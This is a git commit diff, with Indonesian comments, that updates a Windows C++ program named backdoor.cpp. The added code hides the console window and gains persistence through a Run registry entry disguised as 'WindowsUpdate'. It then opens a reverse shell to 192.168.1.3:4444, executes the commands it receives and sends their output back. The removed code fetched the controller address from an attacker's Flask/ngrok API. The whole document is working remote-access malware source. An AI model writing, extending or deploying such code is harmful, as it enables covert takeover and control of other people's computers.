44681e2fab3ad16ce7bd69b32d33d2a55dd6d346
Hikari <zenhikari5@gmail.com>
2025-03-20 15:22:55 +0700

    Update backdoor.cpp

--- backdoor.cpp
+++ backdoor.cpp
@@ -3,92 +3,126 @@
 #include <wininet.h>
 #include <iostream>
 #include <string>
+#include <vector>
+#include <sstream>
 
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "wininet.lib")
 
-#define ATTACKER_API "http://192.168.1.3:5000"  // IP API Flask attacker
+#define ATTACKER_API "http://192.168.1.3:5000"
+#define REG_PATH L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+#define REG_NAME L"WindowsUpdate"
 
-// Fungsi konversi `char*` ke `wchar_t*`
-std::wstring convertToWideString(const std::string& str) {
-    int size_needed = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);
-    std::wstring wstr(size_needed, 0);
-    MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wstr[0], size_needed);
-    return wstr;
+// Fungsi menambahkan program ke registry untuk auto-run
+void add_to_registry()
+{
+    HKEY hKey;
+    char path[MAX_PATH];
+    GetModuleFileNameA(NULL, path, MAX_PATH);
+    std::wstring wPath(path, path + strlen(path));
+
+    if (RegOpenKeyExW(HKEY_CURRENT_USER, REG_PATH, 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+    {
+        RegSetValueExW(hKey, REG_NAME, 0, REG_SZ, (BYTE *)wPath.c_str(), (wPath.length() + 1) * sizeof(wchar_t));
+        RegCloseKey(hKey);
+    }
 }
 
-// Fungsi untuk mengambil alamat Ngrok dari API
-std::string get_ngrok_address() {
-    HINTERNET hInternet, hConnect;
-    char buffer[1024];
-    DWORD bytesRead;
-    std::string result;
+// Fungsi menjalankan perintah shell
+std::string execCommand(const std::string &command)
+{
+    static std::string currentDir = "C:\\";
 
-    hInternet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
-    if (!hInternet) return "";
-
-    std::wstring url = convertToWideString(ATTACKER_API);  // Konversi URL ke `LPCWSTR`
-    hConnect = InternetOpenUrlW(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
-    if (!hConnect) {
-        InternetCloseHandle(hInternet);
-        return "";
+    if (command.length() == 2 && command[1] == ':')
+    {
+        if (SetCurrentDirectoryA(command.c_str()))
+        {
+            currentDir = command + "\\";
+        }
+        return currentDir;
     }
 
-    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead) {
-        buffer[bytesRead] = 0;
+    if (command.substr(0, 3) == "cd ")
+    {
+        std::string newPath = command.substr(3);
+        if (SetCurrentDirectoryA(newPath.c_str()))
+        {
+            char path[MAX_PATH];
+            GetCurrentDirectoryA(MAX_PATH, path);
+            currentDir = path;
+        }
+        return currentDir;
+    }
+
+    // Perbaikan: Menangani perintah 'cls'
+    if (command == "cls")
+    {
+        return "\033[2J\033[H"; // Escape sequence untuk membersihkan layar pada terminal ANSI
+    }
+
+    std::string shellCommand = command;
+    char buffer[128];
+    std::string result = "";
+    FILE *pipe = _popen(shellCommand.c_str(), "r");
+    if (!pipe)
+        return "[ERROR] Failed to execute command.";
+
+    while (fgets(buffer, sizeof(buffer), pipe) != NULL)
+    {
         result += buffer;
     }
-
-    InternetCloseHandle(hConnect);
-    InternetCloseHandle(hInternet);
-    return result;
+    _pclose(pipe);
+    return result.empty() ? "[INFO] Command executed successfully." : result;
 }
 
 // Fungsi untuk menjalankan backdoor
-void run_backdoor() {
+void run_backdoor()
+{
     WSADATA wsa;
     SOCKET sock;
     struct sockaddr_in server;
     WSAStartup(MAKEWORD(2, 2), &wsa);
 
-    while (true) {
-        std::string ngrok_addr = get_ngrok_address();
-        if (ngrok_addr.empty()) {
-            Sleep(5000);
-            continue;
-        }
-
-        size_t colon_pos = ngrok_addr.find(":");
-        if (colon_pos == std::string::npos) {
-            Sleep(5000);
-            continue;
-        }
-
-        std::string ip = ngrok_addr.substr(0, colon_pos);
-        int port = std::stoi(ngrok_addr.substr(colon_pos + 1));
-
+    while (true)
+    {
         sock = socket(AF_INET, SOCK_STREAM, 0);
-        server.sin_addr.s_addr = inet_addr(ip.c_str());
         server.sin_family = AF_INET;
-        server.sin_port = htons(port);
+        server.sin_port = htons(4444);
+        server.sin_addr.s_addr = inet_addr("192.168.1.3");
 
-        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) == 0) {
+        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0)
+        {
             char buffer[1024];
-            while (true) {
+
+            while (true)
+            {
                 int recv_size = recv(sock, buffer, sizeof(buffer), 0);
-                if (recv_size <= 0) break;
+                if (recv_size <= 0)
+                    break;
                 buffer[recv_size] = '\0';
-                system(buffer);
+                std::string command(buffer);
+
+                std::string output = execCommand(command);
+                send(sock, output.c_str(), output.length(), 0);
             }
         }
-
         closesocket(sock);
-        WSACleanup();
         Sleep(10000);
     }
 }
 
-int main() {
-    run_backdoor();
+int main()
+{
+    HWND stealth;
+    AllocConsole();
+    stealth = FindWindowA("ConsoleWindowClass", NULL);
+    ShowWindow(stealth, SW_HIDE);
+
+    add_to_registry();
+    while (true)
+    {
+        run_backdoor();
+        Sleep(5000);
+    }
     return 0;
 }
